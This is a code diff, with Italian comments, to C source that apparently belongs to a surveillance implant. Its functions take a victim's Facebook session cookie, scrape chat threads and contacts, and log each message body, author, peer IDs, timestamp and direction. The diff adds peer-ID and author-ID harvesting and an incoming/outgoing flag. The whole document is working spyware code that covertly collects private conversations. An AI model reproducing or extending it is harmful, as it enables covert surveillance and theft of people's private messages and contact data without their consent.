@@ -14,6 +14,7 @@
 #define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
 #define FB_NEW_LINE "\\u003Cbr \\/> "
 #define FB_POST_FORM_ID "post_form_id\":\""
+#define FB_PEER_ID_IDENTIFIER "\"fbid:"
 #define FB_DTSG_ID "fb_dtsg\":\""
 #define FACEBOOK_THREAD_LIMIT 15
 #define MAX_FACEBOOK_ACCOUNTS 500 
@@ -115,8 +116,11 @@ DWORD HandleFBMessages(char *cookie)
 	BYTE *parser1, *parser2;
 	BYTE *parser_inner1, *parser_inner2;
 	WCHAR fb_request[256];
+	BOOL is_incoming = FALSE;
 	char peers[256];
+	char peers_id[256];
 	char author[256];
+	char author_id[256];
 	char tstamp[11];
 	DWORD act_tstamp;
 	DWORD last_tstamp = 0;
@@ -256,7 +260,32 @@ DWORD HandleFBMessages(char *cookie)
 			SAFE_FREE(r_buffer);
 			return ret_val;
 		}
+
+		// Cerca gli id dei peers
 		parser_inner1 = r_buffer_inner;
+		memset(peers_id, 0, sizeof(peers_id));
+		for (;;) {
+			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, FB_PEER_ID_IDENTIFIER);
+			if (!parser_inner2)
+				break;
+			parser_inner1 = parser_inner2 + strlen(FB_PEER_ID_IDENTIFIER);
+			parser_inner2 = (BYTE *)strstr((char *)parser_inner1, "\"");
+			if (!parser_inner2)
+				break;
+			*parser_inner2 = 0;
+
+			// Non include il nostro utente...
+			if (strcmp((char *)parser_inner1, user)) {
+				if (strlen(peers_id) == 0)
+					_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s", parser_inner1);
+				else
+					_snprintf_s(peers_id, sizeof(peers_id), _TRUNCATE, "%s,%s", peers_id, parser_inner1);
+			}
+
+			parser_inner1 = parser_inner2 +1;
+		}	
+
+		// Clicla per tutti i messaggi del thread
 		for (;;) {			
 			CheckProcessStatus();
 			parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
@@ -275,10 +304,27 @@ DWORD HandleFBMessages(char *cookie)
 				break;
 			*parser_inner2 = 0;
 			parser_inner1 = parser_inner2;
-			for (;*(parser_inner1) != '>'; parser_inner1--);
+			for (;*(parser_inner1) != '>' && parser_inner1 > r_buffer_inner; parser_inner1--);
+			if (parser_inner1 <= r_buffer_inner)
+				break;
 			parser_inner1++;
 			_snprintf_s(author, sizeof(author), _TRUNCATE, "%s", parser_inner1);
+			parser_inner1--;
+			for (;*(parser_inner1) != '\\' && parser_inner1 > r_buffer_inner; parser_inner1--);
+			if (parser_inner1 <= r_buffer_inner)
+				break;
+			*parser_inner1 = 0;
+			for (;*(parser_inner1) != '=' && parser_inner1 > r_buffer_inner; parser_inner1--);
+			if (parser_inner1 <= r_buffer_inner)
+				break;
+			parser_inner1++;
+			_snprintf_s(author_id, sizeof(author_id), _TRUNCATE, "%s", parser_inner1);
 			parser_inner1 = parser_inner2 + 1;
+			
+			if (!strcmp(author_id, user))
+				is_incoming = FALSE;
+			else 
+				is_incoming = TRUE;
 
 			// Cicla per tutti i possibili body del messaggio
 			SAFE_FREE(msg_body);
@@ -330,7 +376,7 @@ DWORD HandleFBMessages(char *cookie)
 				tstamp.tm_year += 1900;
 				tstamp.tm_mon++;
 				JsonDecode(msg_body);
-				LogSocialIMMessageA("Facebook", "", peers, author, msg_body, &tstamp);
+				LogSocialIMMessageA(CHAT_PROGRAM_FACEBOOK, peers, peers_id, author, author_id, msg_body, &tstamp, is_incoming);
 				SAFE_FREE(msg_body);
 			} else
 				break;
@@ -416,6 +462,7 @@ DWORD HandleFBContacts(char *cookie)
 		if (!parser2)
 			break;
 		*parser2 = NULL;
+		_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
 		if (!strcmp(user, parser1))
 			flags |= CONTACTS_MYACCOUNT;
 		parser1 = parser2 + 1;
@@ -439,7 +486,7 @@ DWORD HandleFBContacts(char *cookie)
 		if (!parser2)
 			break;
 		*parser2 = NULL;
-		_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
+		//_snprintf_s(profile_path, sizeof(profile_path), _TRUNCATE, "%s", parser1);
 		parser1 = parser2 + 1;
 
 		// Verifica se c'e' category
